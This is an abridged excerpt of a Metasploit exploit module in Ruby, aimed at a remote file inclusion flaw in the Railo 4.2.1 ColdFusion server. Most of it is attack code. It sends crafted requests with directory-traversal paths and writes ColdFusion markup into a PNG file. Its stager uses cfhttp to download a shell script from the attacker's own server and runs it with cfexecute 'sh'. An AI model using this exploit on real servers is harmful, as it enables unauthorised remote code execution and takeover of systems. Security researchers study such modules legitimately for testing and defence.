...
class Metasploit4 < Msf::Exploit::Remote
  ...
  def initialize(info = {})
    super(update_info(info,
                      ...
                      'Description' => '
                      This module exploits a remote file include 
vulnerability in Railo,
                      tested against version 4.2.1. First, a call using 
a vulnerable
                      <cffile> line in thumbnail.cfm allows an atacker 
to download an
                      arbitrary PNG file. By appending a .cfm, and 
taking advantage of
                      a directory traversal, an attacker can append cold 
fusion markup
                      to the PNG file, and have it interpreted by the 
server. This is
...
'http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/']
                      ...
                      'Payload' => {
                        'Space' => 99999, # if there is disk space, I 
think we will fit
                        'BadChars' => "",
                        'DisableNops' => true,
                        'Compat' => {
                          'PayloadType' => 'cmd',
                          'RequiredCmd' => 'generic netcat perl ruby 
python bash telnet'
                        }
                      },
                      'Platform' => %w(                      unix                      
    ...
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base URI of the Railo 
server', '/railo-context/']),
        OptInt.new('STAGEWAIT', [true, 'Number of seconds to wait for 
stager to download', 10])
      ], self.class)
  end
  ...
  def check
    ...
    res = send_request_cgi(
      'uri' => normalize_uri('res', 'images', 'id.png') # the targeturi 
is not used in this request
    )

    if !res
      fail_with(Failure::Unknown, 'Server did not respond')
    elsif !res.body
      fail_with(Failure::Unknown, "Server responded without a body: 
#{res.code} #{res.message}")
  ...
  def exploit
    if datastore['SRVHOST'] == '0.0.0.0'
      fail_with(Failure::BadConfig, 'SRVHOST must be an IP address 
accessible from another computer')
    end

    url = 'http://' + datastore['SRVHOST'] + ':' + 
datastore['SRVPORT'].to_s
    ...
    if !res
      ...
      fail_with(Failure::Unknown, "Server did not respond with the 
expected HTTP 500: #{res.code} #{res.message}")
    end
    ...
    hash = Rex::Text.md5("#{url + "/" + stager_name}-#{wh}-#{wh}") # 
5000 is width and height from GET
    ...
    send_request_cgi(
      ...
      'vars_get' => {
        'attributes.src' => '../../../../temp/admin-ext-thumbnails/' + 
hash,
  ...
  def on_request_stager(cli, _request)
    url = 'http://' + datastore['SRVHOST'] + ':' + 
datastore['SRVPORT'].to_s + '/' + @shell_name

    stager = "<cfhttp method='get' url='#{url}'"
    stager << " 
path='#GetDirectoryFromPath(GetCurrentTemplatePath())#..\\..\\..\\..\\..\\..\\'"
    stager << " file='#{@shell_name}'>"
    stager << "<cfexecute name='sh' arguments='#{@shell_name}' 
timeout='99999'></cfexecute>"
